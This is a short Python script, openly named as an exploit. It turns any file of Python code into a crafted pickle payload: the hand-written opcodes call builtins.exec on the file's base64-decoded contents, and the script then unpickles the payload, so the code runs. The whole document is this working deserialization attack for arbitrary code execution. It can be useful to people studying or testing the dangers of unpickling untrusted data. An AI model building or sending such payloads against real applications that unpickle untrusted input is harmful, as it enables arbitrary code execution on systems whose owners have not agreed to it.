#!/usr/bin/env python
# encoding:utf-8

import sys
import base64
import pickle

def exploit(filename):
    data = base64.b64encode(open(filename, "rb").read())
    payload = b'''\
cbuiltins
exec
cbase64
b64decode
(S\'''' + data + b'''\
'
tRp0
0(g0
tR.'''
    return payload

def main():
    if len(sys.argv) != 2:
        print("Usage: ")
        print("\tpython %s [FILENAME]" % (sys.argv[0]))
        exit(1)
    filename = sys.argv[1]
    payload = exploit(filename)
    pickle.loads(payload)

if __name__ == "__main__":
    main()